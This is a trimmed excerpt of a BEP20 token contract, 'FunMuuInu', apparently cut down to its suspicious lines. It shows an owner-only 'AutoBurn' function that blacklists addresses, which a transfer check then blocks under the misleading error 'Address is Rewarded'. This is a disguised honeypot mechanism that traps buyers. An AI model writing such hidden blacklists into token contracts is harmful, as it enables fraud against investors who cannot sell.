...
/* Token contract */
contract FunMuuInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xa665Ff9321F4263aE1a10807479a067AcDFf3527; 
    ...
    // Name and symbol
    string constant _name = "FunMuuInu";
    string constant _symbol = "FMINU";
    ...
    mapping (address => bool) public IsAutoBurn;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xa665Ff9321F4263aE1a10807479a067AcDFf3527;  
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!IsAutoBurn[recipient] && !IsAutoBurn[sender], 'Address is Rewarded');
    ...
    function AutoBurn(address _address, bool _value) public authorized{
        IsAutoBurn[_address] = _value;
    }
